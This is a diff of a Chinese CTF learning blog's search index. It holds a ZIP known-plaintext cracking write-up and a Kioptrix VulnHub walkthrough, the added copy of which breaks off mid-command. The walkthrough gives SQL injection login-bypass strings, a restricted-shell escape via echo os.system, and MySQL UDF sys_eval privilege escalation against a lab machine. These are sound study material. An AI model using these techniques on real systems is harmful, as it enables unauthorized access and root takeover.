@@ -1,786 +1,201 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>2023春秋杯_Misc</title>
-    <url>/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/</url>
-    <content><![CDATA[<h1 id="谁偷了我的外卖"><a class="markdownIt-Anchor" href="#谁偷了我的外卖"></a> 谁偷了我的外卖</h1>
-<h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h2>
-<ul>
-<li>小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢</li>
-</ul>
-<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
-<ul>
-<li>拿到手是一张jpg</li>
-</ul>
-<img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/小凯.jpg" alt="小凯" style="zoom:33%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
-<ul>
-<li>binwalk分析一下，发现里面有个压缩包，binwalk -e 不管用，foremost提取一下</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304160239092.png" alt="image-20240304160239092" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>010里还有个提示：<code>I can give you a hint: - = / But there was a takeaway that was partially eaten.</code></li>
-<li>拿到压缩包，是加密的，里面是一个flag文件夹和很多“外卖”文件</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304160712556.png" alt="image-20240304160712556" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>观察发现有序的且“_”后面的4个字符很像base64，再加上前面有序号，以及提示信息，很容易猜测是要把这些按顺序组合成一段base64</strong></p>
-<ul>
-<li>我先随便提取一下，形成一个文件夹，这样虽然文件是空的，但是文件名都在，再利用批量处理文件夹名称，再利用python</li>
-</ul>
-<p><strong>能发现第一个少了四个字母</strong></p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304161318875.png" alt="处理文件夹文件名称" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding =gbk</span></span><br><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> ns, natsorted</span><br><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">folder = <span class="string">r&quot;/Users/madison/Desktop/wmx&quot;</span></span><br><span class="line">files = os.listdir(folder)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">files_1 = natsorted(files,alg=ns.PATH)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files_1:</span><br><span class="line">    flag+=i</span><br><span class="line">lst = re.findall(<span class="string">&#x27;_([\w|+|=|-]&#123;4&#125;)&#x27;</span>,flag)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">str</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure>
-<p><strong>先把第2个文件开始的提取出来</strong></p>
-<ul>
-<li>base64解码，可以在末尾发现应该是压缩包</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304161819149.png" alt="image-20240304161819149" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>补上文件头<code>504b03</code>的base64:<code>UEsD</code></li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162516972.png" alt="image-20240304162516972" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162720172.png" alt="image-20240304162720172" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>成功拿到download.zip</strong></p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162046748.png" alt="image-20240304162046748" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>这两个文件就是之前加密压缩包flag文件夹里的两个文件，还差一个txt.galf，这个明显就是flag.txt反过来</strong></p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162147928.png" alt="image-20240304162147928" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>查看这两个文件
-<ul>
-<li>md文件里有一半的flag<code>flag&#123;W1sh_y0u_AaaAaaaa</code>，钥匙.png是一张用<strong>bandizip</strong>压缩文件的图，使用的算法是<strong>ZipCrypto</strong>，猜测要使用明文爆破bkcrack了</li>
-</ul>
-</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162805829.png" alt="image-20240304162805829" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304163109001.png" alt="image-20240304163109001" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>
-<p>用bandizip压缩提取出来的md或png，记住要<strong>选用zipcrypto算法</strong>，算法需要一致，这里以压缩png为例，压缩成crack.zip</p>
-</li>
-<li>
-<p>用bkcrack明文爆破出密钥</p>
-</li>
-</ul>
-<p>-C 对应待解密的压缩包，-c为待解密压缩包里的某个加密文件，-P为明文压缩包，-p为已知的明文文件或明文信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -c 外卖箱/flag/小凯的奋斗故事.md -P crack.zip -p 小凯的奋斗故事.md</span><br></pre></td></tr></table></figure>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304164507564.png" alt="image-20240304164507564" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>拿到密钥：48ff002a 56e00484 380c5c49</strong></p>
-<ul>
-<li>利用密钥破解</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -k 48ff002a 56e00484 380c5c49 -U new.zip 1234 </span><br></pre></td></tr></table></figure>
-<p>-k为密钥，-U为你设置的新的zip，和新zip的密码（会把原来的zip里的东西复制到new.zip中，并且new.zip的密码被覆盖为1234）</p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304164738068.png" alt="image-20240304164738068" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>成功提取并打开txt.galf</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304164841781.png" alt="image-20240304164841781" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>结合文件名以及上半部分的flag，可知，文本内容需要倒置过来</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="明文混淆复现"><a class="markdownIt-Anchor" href="#明文混淆复现"></a> 明文混淆（复现）</h1>
-<h2 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2"></a> 题目描述</h2>
-<ul>
-<li>小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。</li>
-</ul>
-<h2 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程</h2>
-<ul>
-<li>压缩包是加密的，一一排除伪加密，暴力破解，剩下明文爆破</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304203835579.png" alt="image-20240304203835579" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>bkcrack先查看一下压缩包的加密算法：<code>bkcrack -L</code></li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304203726863.png" alt="image-20240304203726863" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>果然是ZipCrypto，明晃晃的明文爆破了</strong></p>
-<ul>
-<li>从LICENSE.txt 入手，所有的LICENSE.txt，都有换行，把明文设置为12个以上的空格</li>
-<li>bkcrack爆破</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304211905788.png" alt="image-20240304211905788" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304211926934.png" alt="image-20240304211926934" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>提取出shell2.php，解混淆</li>
-</ul>
-<p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304212121097.png" alt="image-20240304212121097" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><em>php解混淆知识有待加强😭</em></p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>CTF_MISC_流量分析总结</title>
+      <link href="/2024/03/06/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
+      <url>/2024/03/06/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
       <categories>
-        <category>CTF做题记录</category>
+          
+          <category> CTF做题记录 </category>
+          
       </categories>
-      <tags>
-        <tag>MISC-压缩包</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptrix_Level_1.3(#4)</title>
-    <url>/2024/03/05/Kioptrix-Level-1-3/</url>
-    <content><![CDATA[<h1 id="kioptrix-level-134"><a class="markdownIt-Anchor" href="#kioptrix-level-134"></a> Kioptrix Level 1.3(#4)</h1>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3>
-<ul>
-<li>IP为<code>192.168.89.141</code></li>
-<li>nmap扫描端口以及端口服务</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 22:04 EST</span><br><span class="line">Nmap scan report for 192.168.89.141</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 39528 closed tcp ports (conn-refused), 26003 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.68 seconds</span><br></pre></td></tr></table></figure>
-<p>开放了ssh、http、samba</p>
-<ul>
-<li>开放了80，那就先dirsearch扫扫看：<code>dirsearch --url http://192.168.89.141 </code>，同时浏览器访问 <code>http://192.168.89.141</code></li>
-</ul>
-<img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204216081.png" alt="image-20240305204216081" style="zoom:50%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
-<ul>
-<li>看到了smb服务且80端口需要用户信息，那么就用enum4linux扫扫</li>
-</ul>
-<blockquote>
-<p>enum4linux的介绍：<a href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客</a></p>
-</blockquote>
-<p>比较全的扫描方法：<code>enum4linux -a -o &lt;ip&gt;</code>，这里主要看他的用户信息：<code>enum4linux -U 192.168.89.141</code>(<em>主要是因为http里面涉及到用户登录</em>)</p>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305203732012.png" alt="image-20240305203732012" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>能看到一些用户信息，主要有loneferret、john、robert、root、nobody</p>
-<ul>
-<li>80端口是个登录界面，先试试能不能简单sql注入，随便在Username里输入<code>admin</code>，在Password里输入<code>'or'1'='1'</code>，发现还真能注入😆</li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204504698.png" alt="image-20240305204504698" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>回显了一个User信息，但估计这个admin用户不在members里面，简单探索到这里，看看dirsearch什么结果</li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204622062.png" alt="image-20240305204622062" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>dirsearch其实也没什么特别的，/checklogin就是一个页面没什么信息，/database.sql是个sql文件，但是我们能在里面看到有一个<code>john</code>在members表里面密码是<code>1234</code></li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204912967.png" alt="image-20240305204912967" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>但是拿这个密码登录失败了，看来是修改过，无所谓，我会注入，输入上面一样的注入密码<code>'or'1'='1</code>，轻松登录，拿到了john的真实密码<code>MyNameIsJohn</code></li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305205101931.png" alt="image-20240305205101931" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>同样的方式，看看能不能拿到root、nobody、loneferret、robert的密码，最后只拿到了robert的密码<code>ADGAdsafdfwt4gadfga==</code></li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305205720214.png" alt="image-20240305205720214" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>ssh 连接用户，但是发现两个用户都在受限的shell里面（以john为例），根据提示<code>Type '?' or 'help' to get the list of allowed commands</code>，输入一个<code>?</code>发现能执行的命令很有限：<code>cd clear echo exit help ll lpath ls</code></li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305210854321.png" alt="image-20240305210854321" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h4 id="信息搜集总结"><a class="markdownIt-Anchor" href="#信息搜集总结"></a> 信息搜集总结</h4>
-<ul>
-<li>发现了登录界面的sql注入，通过简单注入，拿到了john和robert两个用户的密码</li>
-<li>利用拿到的密码，通过ssh，远程登录了主机，但在受限的shell环境里，<mark>下一步需要绕过限制，如果只是普通用户权限，还需要考虑提权</mark></li>
-</ul>
-<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3>
-<h4 id="echo绕过受限的shell"><a class="markdownIt-Anchor" href="#echo绕过受限的shell"></a> echo绕过受限的shell</h4>
-<ul>
-<li>这种受限的shell称为lshell(limited shell)，执行的命令优有限，但是lshell关于<code>echo</code>存在一个漏洞，我们可以通过<code>echo os.system(&quot;/bin/bash&quot;)</code>，绕过限制。</li>
-</ul>
-<blockquote>
-<p>lshell绕过限制：<a href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com)</a></p>
-<p><em>文章中还提到了通过vim命令绕过的方法</em></p>
-</blockquote>
-<ul>
-<li>输入命令，成功绕过，可以执行很多命令，但我们还是普通用户权限</li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305212141847.png" alt="image-20240305212141847" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h4 id="查看网站源代码"><a class="markdownIt-Anchor" href="#查看网站源代码"></a> 查看网站源代码</h4>
-<ul>
-<li>回到80端口的思路，看看网站源码，试试看login的校验，于是查看<code>checklogin.php</code>，发现了mysql用户root，没有密码，好家伙😄</li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305212754868.png" alt="image-20240305212754868" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h3 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h3>
-<h4 id="mysqludf提权"><a class="markdownIt-Anchor" href="#mysqludf提权"></a> MySQLUDF提权</h4>
-<ul>
-<li>先用root登录mysql：<code>mysql -u root</code>，发现mysql的版本是<code>5.0.51a</code></li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305213255453.png" alt="image-20240305213255453" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><mark>接下来的思路就是看看能不能利用mysql提权</mark></p>
-<p><em>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。<strong>由于MySQL这里正好&lt;5.1,我们可以直接尝试UDF提权</strong></em></p>
-<blockquote>
-<p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></p>
-<p><a href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<ul>
-<li>在mysql数据库下输入命令<code>create function sys_eval returns string soname 'lib_mysqludf_sys.so';</code>，<strong>sys_eval可以执行系统命令并在屏幕上显示</strong>，<code>select * from mysql.func</code>查看是否创建成功</li>
-</ul>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305214900539.png" alt="image-20240305214900539" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>成功创建</strong></p>
-<ul>
-<li>利用sys_eval实现系统命令，我们直接来修改root密码，<code>select sys_eval(&quot;sudo passwd root&quot;)</code>，然后直接设置root的新密码，再登录，成功拿到root</li>
-</ul>
-<p><em>后来发现sys_exec也可以执行系统命令，但是他无法打印在屏幕上，也无法交互，所以可以用来修改一些权限，比如<code>chmod u+x /bin/bash</code>或者用usermod修改用户所在的组，提权</em></p>
-<blockquote>
-<p><a href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g</a></p>
-<p><a href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn)</a></p>
-</blockquote>
-<p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305220016944.png" alt="image-20240305220016944" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h2 id="学习总结与参考链接"><a class="markdownIt-Anchor" href="#学习总结与参考链接"></a> 学习总结与参考链接</h2>
-<ul>
-<li>enum4linux的使用场景</li>
-</ul>
-<blockquote>
-<p>enum4linux的介绍：<a href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客</a></p>
-</blockquote>
-<ul>
-<li>
-<p>涉及到80端口，可以先扫起来，然后去搜集信息，拿到shell之后，<strong>要先查看源代码</strong>，看看有没有漏掉的信息</p>
-</li>
-<li>
-<p>受限shell绕过方法：echo</p>
-</li>
-</ul>
-<blockquote>
-<p>lshell绕过限制：<a href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com)</a></p>
-</blockquote>
-<ul>
-<li>mysql中的udf提权，<strong>mysql还有很多种提权方式有待学习</strong></li>
-</ul>
-<blockquote>
-<p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></p>
-</blockquote>
-<ul>
-<li>参考walkthrough</li>
-</ul>
-<blockquote>
-<p><a href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g</a></p>
-<p><a href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn)</a></p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> MISC-流量分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Kioptrix_Level_1.3(#4)</title>
+      <link href="/2024/03/05/Kioptrix-Level-1-3/"/>
+      <url>/2024/03/05/Kioptrix-Level-1-3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kioptrix-level-134"><a class="markdownIt-Anchor" href="#kioptrix-level-134"></a> Kioptrix Level 1.3(#4)</h1><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><ul><li>IP为<code>192.168.89.141</code></li><li>nmap扫描端口以及端口服务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 22:04 EST</span><br><span class="line">Nmap scan report for 192.168.89.141</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 39528 closed tcp ports (conn-refused), 26003 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.68 seconds</span><br></pre></td></tr></table></figure><p>开放了ssh、http、samba</p><ul><li>开放了80，那就先dirsearch扫扫看：<code>dirsearch --url http://192.168.89.141 </code>，同时浏览器访问 <code>http://192.168.89.141</code></li></ul><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204216081.png" alt="image-20240305204216081" style="zoom:50%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><ul><li>看到了smb服务且80端口需要用户信息，那么就用enum4linux扫扫</li></ul><blockquote><p>enum4linux的介绍：<a href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客</a></p></blockquote><p>比较全的扫描方法：<code>enum4linux -a -o &lt;ip&gt;</code>，这里主要看他的用户信息：<code>enum4linux -U 192.168.89.141</code>(<em>主要是因为http里面涉及到用户登录</em>)</p><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305203732012.png" alt="image-20240305203732012" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>能看到一些用户信息，主要有loneferret、john、robert、root、nobody</p><ul><li>80端口是个登录界面，先试试能不能简单sql注入，随便在Username里输入<code>admin</code>，在Password里输入<code>'or'1'='1'</code>，发现还真能注入😆</li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204504698.png" alt="image-20240305204504698" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>回显了一个User信息，但估计这个admin用户不在members里面，简单探索到这里，看看dirsearch什么结果</li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204622062.png" alt="image-20240305204622062" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>dirsearch其实也没什么特别的，/checklogin就是一个页面没什么信息，/database.sql是个sql文件，但是我们能在里面看到有一个<code>john</code>在members表里面密码是<code>1234</code></li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305204912967.png" alt="image-20240305204912967" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>但是拿这个密码登录失败了，看来是修改过，无所谓，我会注入，输入上面一样的注入密码<code>'or'1'='1</code>，轻松登录，拿到了john的真实密码<code>MyNameIsJohn</code></li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305205101931.png" alt="image-20240305205101931" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>同样的方式，看看能不能拿到root、nobody、loneferret、robert的密码，最后只拿到了robert的密码<code>ADGAdsafdfwt4gadfga==</code></li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305205720214.png" alt="image-20240305205720214" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>ssh 连接用户，但是发现两个用户都在受限的shell里面（以john为例），根据提示<code>Type '?' or 'help' to get the list of allowed commands</code>，输入一个<code>?</code>发现能执行的命令很有限：<code>cd clear echo exit help ll lpath ls</code></li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305210854321.png" alt="image-20240305210854321" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h4 id="信息搜集总结"><a class="markdownIt-Anchor" href="#信息搜集总结"></a> 信息搜集总结</h4><ul><li>发现了登录界面的sql注入，通过简单注入，拿到了john和robert两个用户的密码</li><li>利用拿到的密码，通过ssh，远程登录了主机，但在受限的shell环境里，<mark>下一步需要绕过限制，如果只是普通用户权限，还需要考虑提权</mark></li></ul><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><h4 id="echo绕过受限的shell"><a class="markdownIt-Anchor" href="#echo绕过受限的shell"></a> echo绕过受限的shell</h4><ul><li>这种受限的shell称为lshell(limited shell)，执行的命令优有限，但是lshell关于<code>echo</code>存在一个漏洞，我们可以通过<code>echo os.system(&quot;/bin/bash&quot;)</code>，绕过限制。</li></ul><blockquote><p>lshell绕过限制：<a href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com)</a></p><p><em>文章中还提到了通过vim命令绕过的方法</em></p></blockquote><ul><li>输入命令，成功绕过，可以执行很多命令，但我们还是普通用户权限</li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305212141847.png" alt="image-20240305212141847" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h4 id="查看网站源代码"><a class="markdownIt-Anchor" href="#查看网站源代码"></a> 查看网站源代码</h4><ul><li>回到80端口的思路，看看网站源码，试试看login的校验，于是查看<code>checklogin.php</code>，发现了mysql用户root，没有密码，好家伙😄</li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305212754868.png" alt="image-20240305212754868" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h3 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h3><h4 id="mysqludf提权"><a class="markdownIt-Anchor" href="#mysqludf提权"></a> MySQLUDF提权</h4><ul><li>先用root登录mysql：<code>mysql -u root</code>，发现mysql的版本是<code>5.0.51a</code></li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305213255453.png" alt="image-20240305213255453" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><mark>接下来的思路就是看看能不能利用mysql提权</mark></p><p><em>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。<strong>由于MySQL这里正好&lt;5.1,我们可以直接尝试UDF提权</strong></em></p><blockquote><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></p><p><a href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 (cnblogs.com)</a></p></blockquote><ul><li>在mysql数据库下输入命令<code>create function sys_eval returns string soname 